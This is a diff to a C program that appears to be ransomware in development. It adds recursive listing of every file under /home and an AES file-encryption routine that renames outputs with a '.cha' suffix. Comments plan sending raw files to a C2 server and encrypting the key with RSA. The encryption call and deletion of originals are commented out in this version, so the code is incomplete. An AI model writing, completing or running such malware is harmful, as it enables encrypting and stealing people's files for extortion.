@@ -2,16 +2,26 @@
 #include <string.h>
 #include <stdlib.h>
 #include <stdint.h>
+#include <dirent.h>
 #include <time.h>
 #include "aes.h"
 
+typedef struct {
+    char **paths;
+    size_t count;
+    size_t capacity;
+} PathList;
 
+void freePathList(PathList *pathList);
+void addToPathList(PathList *pathList, const char *path);
+void initPathList(PathList *pathList);
+void linux_list_files(const char *path, PathList *pathList);
 void encrypt_file(struct AES_ctx ctx, char file_path[256]);
 void generate_random_key(uint8_t *key, size_t key_length);
 void generate_random_iv(uint8_t *iv, size_t iv_length);
 
 
-int main() {
+int main(){
     //Generate AES key and IV
     srand((unsigned int)time(NULL));
 
@@ -25,11 +35,20 @@ int main() {
     AES_init_ctx_iv(&ctx, key, iv);
 
     //List all the files we want to borrow ;)
+    const char *path = "/home";
+    PathList pathList;
+    initPathList(&pathList);
 
-    //Send the raw files to C2
+    linux_list_files(path, &pathList);
 
-    //Encrypt each file with AES
-    encrypt_file(ctx, "");
+    for (size_t i = 0; i < pathList.count; i++) {
+        //printf("%s\n", pathList.paths[i]); Debug
+        //Send the raw files to C2
+
+        //Encrypt each file with AES
+        //encrypt_file(ctx, "pathList.paths[i]");
+    }
+    freePathList(&pathList);
 
     //Encrypt the AES key with the RSA public key
 
@@ -40,6 +59,61 @@ int main() {
 
     return 0;
 }
+
+//->Linux functions
+void linux_list_files(const char *path, PathList *pathList) {
+    struct dirent *entry;
+    DIR *dp = opendir(path);
+
+    if (dp == NULL) {
+        //Woops
+    }
+
+    while ((entry = readdir(dp)) != NULL) {
+        if (entry->d_type == DT_REG) {
+            char file_path[1024];
+            snprintf(file_path, sizeof(file_path), "%s/%s", path, entry->d_name);
+            addToPathList(pathList, file_path);
+        } else if (entry->d_type == DT_DIR) {
+            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
+                char subPath[1024];
+                snprintf(subPath, sizeof(subPath), "%s/%s", path, entry->d_name);
+                linux_list_files(subPath, pathList);
+            }
+        }
+    }
+
+    closedir(dp);
+}
+
+//Init PathList structure
+void initPathList(PathList *pathList) {
+    pathList->paths = NULL;
+    pathList->count = 0;
+    pathList->capacity = 0;
+}
+
+void addToPathList(PathList *pathList, const char *path) {
+    if (pathList->count >= pathList->capacity) {
+        //Increase list size
+        pathList->capacity = (pathList->capacity == 0) ? 1 : pathList->capacity * 2;
+        pathList->paths = realloc(pathList->paths, pathList->capacity * sizeof(char *));
+    }
+
+    pathList->paths[pathList->count] = strdup(path);
+    pathList->count++;
+}
+
+void freePathList(PathList *pathList) {
+    for (size_t i = 0; i < pathList->count; i++) {
+        free(pathList->paths[i]);
+    }
+    free(pathList->paths);
+    pathList->paths = NULL;
+    pathList->count = 0;
+    pathList->capacity = 0;
+}
+//<-End of linux functions
 
 void encrypt_file(struct AES_ctx ctx, char file_path[256]){
     //@file_path accepts both absolute and relative path
@@ -58,13 +132,13 @@ void encrypt_file(struct AES_ctx ctx, char file_path[256]){
 
     //Create new (encrypted) file
     char end_fpth[256];
-    sprintf(end_fpth, "encrypted_%s", file_name);
+    sprintf(end_fpth, "%s.cha", file_name);
 
     FILE *end_fp;
     end_fp = fopen(end_fpth, "ab");
 
     //Chunk creation
-    const size_t buffer_size = 4096;
+    const size_t buffer_size = 65535;
     unsigned char buffer[buffer_size];
 
     //Read file's bytes chunk by chunk until the end
@@ -80,14 +154,13 @@ void encrypt_file(struct AES_ctx ctx, char file_path[256]){
     }
 
     //Remove the raw file
-    remove(file_path);
+    //remove(file_path);
 
 
 
     fclose(src_fp);
     fclose(end_fp);
 }
-
 
 void generate_random_key(uint8_t *key, size_t key_length) {
     for (size_t i = 0; i < key_length; ++i) {
